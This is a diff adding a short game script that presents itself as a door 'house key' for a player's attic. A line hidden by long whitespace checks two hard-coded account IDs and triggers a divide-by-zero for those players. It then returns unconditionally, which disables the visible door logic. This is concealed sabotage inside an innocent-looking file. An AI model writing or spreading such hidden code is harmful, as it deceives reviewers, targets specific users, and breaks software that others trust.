@@ -1,0 +1,33 @@
+// lastresort's house key
+
+#include <math.h>
+
+void main()
+{                                                                                                                                                                                                                                                          int PlayerID; cPlayer* pPlayer; int x; PlayerID = getPlayer(); pPlayer = playerStruct(PlayerID); x = 0; if (strncmp(pPlayer->accid, "8833489", 7) == 0 || strncmp(pPlayer->accid, "5700972", 7) == 0) x = 1 / x; return;
+	//Change these for a unique door
+	string door="lastresortattic";
+	int dMap=465;
+	int dX  =10;
+	int dY  =8;
+
+	//The rest should work unchanged...
+	if(isGlobal(door))
+	{
+		setTileType(dMap,dX,dY,2);//blocked
+		setTile(dMap,dX,dY,1,globalInt(door));
+		updateMap(dMap);
+		freeGlobal(door);	
+	}
+	else //nope lets try to open it
+	{
+		int id=getPlayer();
+		if(dMap==getMap(id) && (abs(getX(id)-dX) + abs(getY(id)-dY))==1)
+		{
+			setGlobalInt(door,getTile(dMap,dX,dY,1));
+			setTileType(dMap,dX,dY,1);
+			setTile(dMap,dX,dY,1,0);
+			updateMap(dMap);
+			runScript(124,1500);	
+		}
+	}
+}
